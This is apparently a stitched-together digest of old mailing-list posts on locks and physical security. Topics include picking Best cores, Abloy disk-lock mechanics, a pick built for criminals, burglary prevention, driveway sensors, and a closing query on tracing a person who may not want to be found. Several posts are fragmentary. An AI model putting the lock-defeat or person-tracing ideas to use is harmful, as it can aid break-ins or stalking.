the samples in the drying ovens (He made a master key to get in
the lab.).  I spent five weeks trying to get two analyses to
check within the required limits.  When I drew a new sample I was
done in no time.  I can only assume that my sample was one of the
ones 'salted'.  I was also not the only one in the lab night
after night.

Theft of passwords or introduction of a virus in a computer lab

I suggest a test to determine the actual effectiveness of such a tool.
According to my source (a book published by the National Locksmith devoted
to the subject of interchangeable cores the name of which currently escapes
me), this designing this type of tension wrench made it much easier for him
to pick the control shear.  Some one out there must have a Best core and the
proper tools to design and use the tension wrench.  If I had a Best core or
access to one I would be more than happy to test this technique out, but
unfortunately I don't currently own any Best cores.

The tension tool I saw pictured in the book looked like the average tension
wrench (of the HPC variety) with a groove filed such that the wrench would
contact the control shell only.

Look at what the "pros" do.  At  NSA  the  system  is  different.
Yes,  they  may  have  master key systems, but for really serious
areas they have a special deal:  The lock is a dead bolt which is
surrounded  with  at metal shell with a flap.  The flap is a hasp
with a flange though it for a normal pad lock.  When locking, one
locks  the  normal  dead  bolt  lock.  Then  closes the hasp, and
places a combination pad lock through the hasp and locks the  pad
lock.  One has to rip off the whole assembly to get in.

The pad lock is a Sargent-Greenleaf lock that is  very  difficult
to  open normally and almost impossible to pick.  The work factor
of  the  whole  system  is  10  hours.   Obviously  cleaning  and
maintenance  people need appointments to get in.  Security has to
have a sealed envelope with the combination (or a cutting torch).

As a freshman at Caltech in 1963 I took an unofficial course in locks
from a club dedicated to the opening of locked doors called the "Mickey
Mouse Club".  I suspect that a few years later the members were hacking
computer systems rather than mechanical locks.  The members were only
interested in the locks, rather than the contents; one of the leaders took
a job at an office in a former bank so that he could work on the old vault
lock (unfortunately he opened in in 1/2 hour but had to stay at that job for
the rest of the summer).  To make a long story short, one of the pieces of
information one learned was the combination for the north and south campus
grand masters.  It is my understanding that this situation was well known
to the administration, but that they were unwilling to spend the money to
rekey the campus (was it ever done? ) and realized that the new combination
could be discovered in minutes anyway, with some luck.  In any case, all of
the students learned to pick pin tumbler locks in seconds so that possession
of the master key was not very important.

The best suggestions from our local police (courtesy of many
Neighborhood Watch meetings) are simply to make your home an
unattractive target.  The ways to do this are pretty simple
and inexpensive.

Install exterior lights and leave them on all night -- not
just until you go to bed.

Make the house look occupied at all times.  Leave lights and
maybe a radio or TV turned on when you are not home.  If you
really want to get carried away, unhook the phone ringers.
This isn't really necessary because most burgleries are not
carefully plotted and schemed.  Almost no one is going to
bother phoning to see if the lights are on but nobody is
home.

Make sure your windows are locked with locks that don't give
way easily.  A burgler will try to pry a window open
(silently) but usually won't bother with the mess (and
noise) of breaking glass.

Start a Neighborhood Watch program.  Your best protection is
the nosy neighbor across the street who is always peering
out the front window and ready to dial 9-1-1.

A quick, inexpensive way of doing this would be using 'electric eye' type
circuits but with GaAs infrared LED's.  They're inexpensive, easy to hide,
and give off no visible light.  Put the LED transmitter on the end of
your driveway (such as on a mailbox, or concealed on a driveway marker)
and have it transmit diagonally across the driveway to a detector at the
house.  That's the basics, but you can have false-alarms with a single
beam.  Using two parallel beams about 4 feet apart, setting 'alarm' only
on a double-break, would avoid scaring the wife when a dog strolls by.
This would seem much easier than tearing up your driveway to install or
repair a pressure-sensitive or metal-detecting device.

Subject:      Re: Driveway Metel Detector

Most left turn signals detect a car waiting with a coil of wire buried
beneath the pavement.  When the car travels over the coil, current is
made and detected by the turn signal circuit.  One problem with this
is that some small cars and many motorcycles will not cause enough
current to trigger the light.  A better and cheaper way to detect a car
pulling up in the driveway is to use a light sensor, like what is used
in 7-elevens when you enter the door, the light is obstructed and a
bell is sound.  Using this system, your driveway would not have to be
dug up to install a coil.  Placed at the bottom of the driveway, the
light sensor will detect any vehicle entering the driveway.  I'm not
sure what one of these cost, but I'm sure your nearest Radio Shack will
have information on these systems.

Most of the inexpensive auto alarms use a current transformer or 
a voltage sensor on the internal wiring harness. In either case
the system looks for a step change, indicating a dome lamp
has come on. Of course, if the trunk or hood has no light,
or the passenger door switch is bad, or the rear doors have no switches,
well then you are SOL.
Conversely, if the clock motor starts, or the cellular phone receives a call
everybody knows it.

Subject: Abloy

Abloys are "high security" locks, on a par with Medeco as far as the commercial
market is concerned.  I cannot believe that Manhattan locksmiths can't deal
with it; there are Abloys in use all *over* NYC.

The reason there's so much slop is that the key doesn't push pins up, it
turns little disks around inside to a certain amount, allowing a sidebar
type of thing to drop into slots when they line up.  It works much like a
dial-type combination lock, except that the disks all turn together as you
rotate the key through the first 90 degrees.  The clearance between the
key and the holes in the disks is not too critical; the angle to which the
disk is turned is what is.

I would heartily recommend that you hang on to your Abloy, try to find
someone who can dupe a key for it.  If you're feeling enterprising you can
take the thing apart and see how it works, and make yourself a duplicate key
with a little creative metalwork.

From: Fred Blonder <fred@brillig.umd.edu>

	I inherited an "Abloy" lock on my front door.  Was wondering
	if the lock theory experts on this list have had any
	experience or comments about this sort of lock.

Here's what I recall from an article about the Abloy lock in Popular
Science (yeah, I used to read it) when it first came on the market.

Instead of having pins, the Abloy has a series of disks, stacked
in a row along the lock's horizontal axis (Figure 1). Each disk
has a cutout in the shape of an Archimedes Spiral: the
distance-from-the-center-axis varies linearly with the angle.
Initially, all the disks are lined up so that the maximum spiral-size
lines up with the keyway, to make room for the maximally-large key,
that is one with no cuts. When the key is inserted - unlike in a
pin-tumbler lock - nothing moves to 'feel' the key's shape (Figure 2).
The unlocking action does not occur as soon as the key is fully
inserted.

As the key is rotated in the lock, it eventually comes up against
the spiral edges of the cuts in the disks. Since the surface is
spiraled, the exact point in the key's rotation where this occurs
depends on the height that the key has been cut to at the point
where it passes through that particular disk. Once the key is
touching the disk, further rotation of the key drags the disk along
with it for the remainder of the key rotation. At the end of
rotation, the disks will be in a scrambled state, at least as
determined by the inner spiral cut, but one which conveniently
happens to line up the notches in the outer edges of the disks,
which allows a bar which spans the disks, to drop into the groove
formed by the lined-up notches.  (Sort of like in a combination
lock.) Further rotation of the key, disks, and bar, finally slide
the bolt or whatever it is that the lock is controlling. When
rotating the key back the other way, it presses against the
non-spiraled edge of the disks' inner cutouts, and drags them all
back to the starting configuration. A consequence of all this is
that the wrong key will rotate in the lock, but not open it.

I think the difficulty in picking it arises mainly by virtue of
the fact that it is so bizarre.  You'd need to manipulate the little
disk-thingys while attempting to get the bar to drop. Sort of the
worst of picking a pin-tumbler lock combined with picking a
combination lock.

My father was an eccentric sort of character who liked challenges.  Through
friends, he was contacted by some organized crime types who wanted a pick for
Abloy locks.  From what I understood, at the time the casinos in Nevada had
just changed over to these locks on their slot machines.  

The keys to these locks were cylindrical and had cuts made at (I think)
multiples of 15 degrees.  My father built a peculiar looking device that
took a lot of complex machining, with a half dozen or so (one for each cut)
fingers that lifted into place and then were stopped down with a friction
collar.  The pick was inserted and manipulated until the fingers "read" the
bevels in the lock, locked down, and withdrawn.  The user then went off and
made a key to those specs. 

I don't know if he ever perfected the scheme, but it was complex enough to
keep him occupied and interested for about six months.

I'd like to start a discussion of how to  find  a  person.   For,

who left the state 10 years ago because the  Hell's  Angels  were

How would you go  about  finding  such  a  person?   The  obvious
security  issue  here  is perhaps this person does not want to be
found.  DMV records would be the first place I would  look,  then
perhaps at Social Security.  But who has access to these records?

Suppose you had a female friend that you'd lost track of: there's
a  good  chance  she  has married and thus changed her name.  How
does this complicate the search?

What rights w.r.t. privacy does one have if they do not  want  to
be  found?   (As  we  know  from  the  Bork hearings, there is no
Constitutional right to privacy.)
